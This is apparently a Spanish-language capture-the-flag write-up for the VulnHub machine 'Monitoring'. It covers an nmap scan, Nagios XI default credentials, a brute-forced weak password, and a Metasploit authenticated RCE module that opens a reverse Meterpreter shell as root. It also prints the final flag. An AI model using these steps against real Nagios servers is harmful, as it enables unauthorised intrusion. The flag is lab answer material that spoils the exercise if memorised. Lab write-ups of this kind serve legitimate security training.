---
icon: flag
---

# Monitoring VulnHub

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-19 06:11 EDT
Nmap scan report for 192.168.5.193
Host is up (0.00022s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b8:8c:40:f6:5f:2a:8b:f7:92:a8:81:4b:bb:59:6d:02 (RSA)
|   256 e7:bb:11:c1:2e:cd:39:91:68:4e:aa:01:f6:de:e6:19 (ECDSA)
|_  256 0f:8e:28:a7:b7:1d:60:bf:a6:2b:dd:a3:6d:d1:4e:a4 (ED25519)
25/tcp   open  smtp       Postfix smtpd
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-09-08T17:59:00
|_Not valid after:  2030-09-06T17:59:00
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Nagios XI
|_http-server-header: Apache/2.4.18 (Ubuntu)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Not valid before: 2020-09-08T18:28:08
|_Not valid after:  2030-09-06T18:28:08
|_ssl-date: TLS randomness does not represent time
|_http-title: Nagios XI
|_http-server-header: Apache/2.4.18 (Ubuntu)
5667/tcp open  tcpwrapped
MAC Address: 00:0C:29:22:4F:D1 (VMware)
Service Info: Host:  ubuntu; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.89 seconds
```

Si nos vamos al puerto 80 normal encontramos un boton que nos lleva a un login de `nagios` el cual parece vulnerable, si buscamos en google las credenciales por defecto de un `nagios` vemos lo siguiente...

```
root/nagiosxi

o tambien

nagiosadmin/nagiosadmin
```

Si probamos no nos va a ir ninguna, pero si hacemos fuerza bruta con el usuario `nagiosadmin` para adivinar la `password` vemos que es `admin`, por lo que nos vamos a `metasploit`...

```shell
msfconsole -q

> use exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
> set RHOSTS <IP>
> set PASSWORD admin
> set LHOST <YOUR_IP>
> run
```

Info:

```
[*] Started reverse TCP handler on 192.168.5.175:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI.
[*] Target is Nagios XI with version 5.6.0.
[+] The target appears to be vulnerable.
[*] Uploading malicious 'check_ping' plugin...
[*] Command Stager progress - 100.00% done (897/897 bytes)
[+] Successfully uploaded plugin.
[*] Executing plugin...
[*] Waiting up to 300 seconds for the plugin to request the final payload...
[*] Sending stage (3045380 bytes) to 192.168.5.193
[*] Meterpreter session 1 opened (192.168.5.175:4444 -> 192.168.5.193:59266) at 2024-06-19 07:00:33 -0400
[*] Deleting malicious 'check_ping' plugin...
[+] Plugin deleted.

meterpreter >
```

Con esto ya habriamos vulnerado la maquina y seriamos el usuario `root`, por lo que leeremos la flag...

> proof.txt (flag\_final)

```
SunCSR.Team.3.af6d45da1f1181347b9e2139f23c6a5b
```
